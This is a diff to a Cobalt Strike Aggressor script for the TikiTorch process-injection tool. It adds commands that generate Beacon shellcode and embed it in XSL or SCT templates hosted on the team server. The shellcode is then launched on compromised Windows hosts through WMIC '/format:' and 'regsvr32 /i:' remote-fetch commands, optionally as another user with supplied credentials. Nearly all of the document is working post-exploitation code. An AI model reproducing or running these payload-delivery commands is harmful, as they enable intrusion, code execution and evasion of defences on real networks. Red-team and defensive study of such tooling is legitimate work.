@@ -1,6 +1,305 @@
-sub launch_tikitorch {
+sub get_template {
+
+	$arch = $1;
+	$format = $2;
+
+	if ($format eq "xsl") {
+		if ($arch eq "x64") {
+			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x64.xsl");
+		} else {
+			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x86.xsl");
+		}
+	} else if ($format eq "sct") {
+		if ($arch eq "x64") {
+			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x64.sct");
+		} else {
+			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x86.sct");
+		}
+	}
+
+	return $template;
+
+}
+
+sub data_sub {
 	
-	local('%options $script $uri $payload');
+	$process = $1;
+	$payload = $2;
+	$format = $3;
+	$template = $4;
+
+	if ($format eq "sct") {
+
+		if (-canread $template) {
+
+			$handle = openf($template);
+			@data = readAll($handle);
+			closef($handle);
+			remove(@data, @data[34]);
+			add(@data, "var tp = \" $+ $process $+ \"\;", 34);
+			remove(@data, @data[35]);
+			add(@data, "var sc = \" $+ $payload $+ \"\;", 35);
+
+			$data = "";
+
+			for ($i = 0; $i < size(@data); $i++){
+				$data = $data . @data[$i] . "\r\n";
+			}
+
+		}
+
+	} else if ($format eq "xsl") {
+
+		if (-canread $template) {
+
+			$handle = openf($template);
+			@data = readAll($handle);
+			closef($handle);
+			remove(@data, @data[33]);
+			add(@data, "var tp = \" $+ $process $+ \"\;", 33);
+			remove(@data, @data[34]);
+			add(@data, "var sc = \" $+ $payload $+ \"\;", 34);
+
+			$data = "";
+
+			for ($i = 0; $i < size(@data); $i++){
+				$data = $data . @data[$i] . "\r\n";
+			}
+
+		}
+	}
+
+	return $data;
+
+}
+
+alias tikispawn {
+
+	$bid = $1;
+
+	$input = substr($0, 10);
+	@args = split(' ', $input);
+
+	#########################
+	### Check Args Length ###
+	#########################
+
+	if (size(@args) eq "4") {
+
+		$arch = @args[0];
+		$listener = @args[1];
+		$process = @args[2];
+		$format = @args[3];
+
+	} else {
+
+		berror($bid, "Invalid number of arguments");
+		return;
+
+	}
+
+	######################
+	### Error Handling ###
+	######################
+
+	if (($arch ne "x64") && ($arch ne "x86")) {
+		berror($bid, "Invalid architecture");
+		return;
+	}
+
+	if (listener_info($listener, "payload") eq "") {
+		berror($bid, "Invalid listener");
+		return;
+	}
+
+	@valid_formats = @("xsl", "sct");
+	$check = iff($format in @valid_formats, "true", "false");
+
+	if ($check eq "false") {
+		berror($bid, "Invalid payload format");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " via TikiTorch " . $format);
+
+	########################
+	### Generate Payload ###
+	########################
+
+	artifact_stageless($listener, "raw", $arch, "", $this);
+	yield;
+	$payload = base64_encode($1);
+
+	#####################
+	### Grab Template ###
+	#####################
+
+	$template = get_template($arch, $format);
+
+	################
+	### Data Sub ###
+	################
+
+	$final = data_sub($process, $payload, $format, $template);
+
+	####################
+	### Host Payload ###
+	####################
+
+	$host = localip();
+	$port = "80";
+
+	@letters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
+
+	$uri = "/";
+
+	for ($i = 0; $i < 9; $i++) {
+		$uri = $uri . rand(@letters);
+	}
+
+	if ($format eq "xsl") {
+		$uri = $uri . ".xsl"
+	}
+
+	$url = site_host($host, $port, $uri, $final, "text/plain", "TikiTorch", false);
+
+	##################
+	### Execute It ###
+	##################
+
+	if ($format eq "xsl") {
+		beacon_execute_job($bid, "C:\\Windows\\System32\\wbem\\WMIC.exe", " os get /format:\" $+ $url $+ \"", 0);
+	} else if ($format eq "sct") {
+		beacon_execute_job($bid, "C:\\Windows\\System32\\regsvr32.exe", " /s /n /u /i:\" $+ $url $+ \" scrobj.dll", 0);
+	}
+
+}
+
+alias tikispawnas {
+
+	$bid = $1;
+
+	$input = substr($0, 12);
+	@args = split(' ', $input);
+
+	#########################
+	### Check Args Length ###
+	#########################
+
+	if (size(@args) eq "6") {
+
+		$user = @args[0];
+		$pass = @args[1];
+		$arch = @args[2];
+		$listener = @args[3];
+		$process = @args[4];
+		$format = @args[5];
+
+	} else {
+
+		berror($bid, "Invalid number of arguments");
+		return;
+
+	}
+
+	@parts = split('\\\\', $user);
+
+	if (size(@parts) eq "1") {
+
+		$domain = ".";
+		$user = @parts[0];
+
+	} else if (size(@parts) eq 2) {
+
+		$domain = @parts[0];
+		$user = @parts[1];
+
+	} else {
+
+		berror($bid, "Confused about the username");
+		return;
+
+	}
+
+	######################
+	### Error Handling ###
+	######################
+
+	if (($arch ne "x64") && ($arch ne "x86")) {
+		berror($bid, "Invalid architecture");
+		return;
+	}
+
+	if (listener_info($listener, "payload") eq "") {
+		berror($bid, "Invalid listener");
+		return;
+	}
+
+	@valid_formats = @("xsl", "sct");
+	$check = iff($format in @valid_formats, "true", "false");
+
+	if ($check eq "false") {
+		berror($bid, "Invalid payload format");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " via TikiTorch " . $format . " as " . $user);
+
+	########################
+	### Generate Payload ###
+	########################
+
+	artifact_stageless($listener, "raw", $arch, "", $this);
+	yield;
+	$payload = base64_encode($1);
+
+	#####################
+	### Grab Template ###
+	#####################
+
+	$template = get_template($arch, $format);
+
+	################
+	### Data Sub ###
+	################
+
+	$final = data_sub($process, $payload, $format, $template);
+
+	####################
+	### Host Payload ###
+	####################
+
+	$host = localip();
+	$port = "80";
+
+	@letters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
+
+	$uri = "/";
+
+	for ($i = 0; $i < 9; $i++) {
+		$uri = $uri . rand(@letters);
+	}
+
+	if ($format eq "xsl") {
+		$uri = $uri . ".xsl"
+	}
+
+	$url = site_host($host, $port, $uri, $final, "text/plain", "TikiTorch", false);
+
+	##################
+	### Execute It ###
+	##################
+
+	if ($format eq "xsl") {
+		brunas($bid, "$domain", "$user", "$pass", "C:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\" $+ $url $+ \"");
+	} else if ($format eq "sct") {
+		brunas($bid, "$domain", "$user", "$pass", "C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:\" $+ $url $+ \" scrobj.dll");
+	}
+
+}
+
+sub host_tikitorch {
+
 	%options = $3;
 
 	$uri = $3["uri"];
@@ -12,92 +311,74 @@ sub launch_tikitorch {
 	$process = $3["process"];
 	$format = $3["format"];
 
-	if ($arch eq "true") {
-		if ($stage eq "true") {
-			# 64bit stageless
-			artifact_stageless($listener, "raw", "x64", "", $this);
-			yield;
-			$payload = $1;
-		} else {
-			# 64bit staged
-			$payload = shellcode($listener, false, "x64");
-		}
+	########################
+	### Generate Payload ###
+	########################
+
+	if ($stage eq "stageless") {
+
+		artifact_stageless($listener, "raw", $arch, "", $this);
+		yield;
+		$payload = base64_encode($1);
+
 	} else {
-		if ($stage eq "true") {
-			# 32bit stageless
-			artifact_stageless($listener, "raw", "x86", "", $this);
-			yield;
-			$payload = $1;
-		} else {
-			# 32bit staged
-			$payload = shellcode($listener, false, "x86");
-		}
+
+		$payload = shellcode($listener, false, $arch);
+
 	}
 
-	$encpayload = base64_encode($payload);
+	#####################
+	### Grab Template ###
+	#####################
 
-	if ($format eq "Scriptlet") {
+	$template = get_template($arch, $format);
 
-		if ($arch eq "true") {
-			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x64.sct");
-		} else {
-			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x64.sct");
-		}
+	################
+	### Data Sub ###
+	################
 
-		if (-canread $template) {
+	$final = data_sub($process, $payload, $format, $template);
 
-		$handle = openf($template);
-		@data = readAll($handle);
-		closef($handle);
-		remove(@data, @data[34]);
-		add(@data, "var tp = \" $+ $process $+ \"\;", 34);
-		remove(@data, @data[35]);
-		add(@data, "var sc = \" $+ $encpayload $+ \"\;", 35);
+	####################
+	### Host Payload ###
+	####################
 
-		$data = "";
-
-		for ($i = 0; $i < size(@data); $i++){
-			$data = $data . @data[$i] . "\r\n";
-		}
-
-		$hosted = site_host($host, $port, $uri, $data, "plain/text", "TikiTorch Scriptlet Payload");
-		prompt_text("Command: ", "regsvr32 /s /n /u /i:\" $+ $hosted $+ \" scrobj.dll", {});
-
-		}
-
-	} else if ($format eq "Stylesheet") {
-		if ($arch eq "true") {
-			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x64.xsl");
-		} else {
-			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x64.xsl");
-		}
-
-		if (-canread $template) {
-
-		$handle = openf($template);
-		@data = readAll($handle);
-		closef($handle);
-		remove(@data, @data[33]);
-		add(@data, "var tp = \" $+ $process $+ \"\;", 33);
-		remove(@data, @data[34]);
-		add(@data, "var sc = \" $+ $encpayload $+ \"\;", 34);
-
-		$data = "";
-
-		for ($i = 0; $i < size(@data); $i++){
-			$data = $data . @data[$i] . "\r\n";
-		}
-
-		$hosted = site_host($host, $port, $uri . ".xsl", $data, "plain/text", "TikiTorch Stylesheet Payload");
-		prompt_text("Command: ", "wmic os get /format:\" $+ $hosted $+ \"", {});
-
-		}
+	if ($format eq "xsl") {
+		$uri = $uri . ".xsl"
 	}
+
+	$url = site_host($host, $port, $uri, $final, "text/plain", "TikiTorch", false);
+
+	if ($format eq "xsl"){
+		prompt_text("Command: ", "wmic os get /format:\" $+ $url $+ \"", {});
+	} else if ($format eq "sct"){
+		prompt_text("Command: ", "regsvr32 /s /n /u /i:\" $+ $url $+ \" scrobj.dll", {});
+	}
+	
 }
+
+beacon_command_register (
+
+	"tikispawn", 
+	"Spawn a session via TikiTorch", 
+	"Use: tikispawn [x86|x64] [listener] [binary] [format]\n\n" .
+	"Spawn a new session as the current user via TikiTorch."
+
+);
+
+beacon_command_register (
+
+	"tikispawnas", 
+	"Spawn a session as another user via TikiTorch", 
+	"Use: tikispawnas [DOMAIN\\user] [password] [x86|x64] [listener] [binary] [format]\n\n" .
+	"Attempt to spawn a payload as another user. If you don't specify DOMAIN\n" .
+	"Beacon will try to authenticate as a local user."
+
+);
 
 popup attacks {
 	
-	item "TikiTorch" {
+	item "Host TikiTorch" {
 
 		local('$dialog %defaults');
 
@@ -105,19 +386,18 @@ popup attacks {
 		%defaults["host"] = localip();
 		%defaults["port"] = 80;
 		%defaults["stage"] = "true";
-		%defaults["arch"] = "true";
-		%defaults["process"] = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe";
+		%defaults["process"] = "C:\\\\Windows\\\\System32\\\\calc.exe";
 
-		$dialog = dialog("TikiTorch", %defaults, &launch_tikitorch);
+		$dialog = dialog("TikiTorch", %defaults, &host_tikitorch);
 		dialog_description($dialog, "Host a TikiTorch Payload on the CS Team Server.");
 		drow_text($dialog, "uri", "URI Path: ");
 		drow_text($dialog, "host", "Local Host: ");
 		drow_text($dialog, "port", "Local Port: ");
 		drow_listener_stage($dialog, "listener", "Listener: ")
-		drow_checkbox($dialog, "arch", "Architecture: ", "64-bit");
-		drow_checkbox($dialog, "stage", "Stage: ", "Stageless");
+		drow_combobox($dialog, "arch", "Architecture: ", @("x64", "x86"));
+		drow_combobox($dialog, "stage", "Stage: ", @("stageless", "staged"));
 		drow_text($dialog, "process", "Target Process Path: ");
-		drow_combobox($dialog, "format", "Format: ", @("Scriptlet", "Stylesheet"));
+		drow_combobox($dialog, "format", "Format: ", @("xsl", "sct"));
 		dbutton_action($dialog, "Go");
 		dialog_show($dialog);
 	}
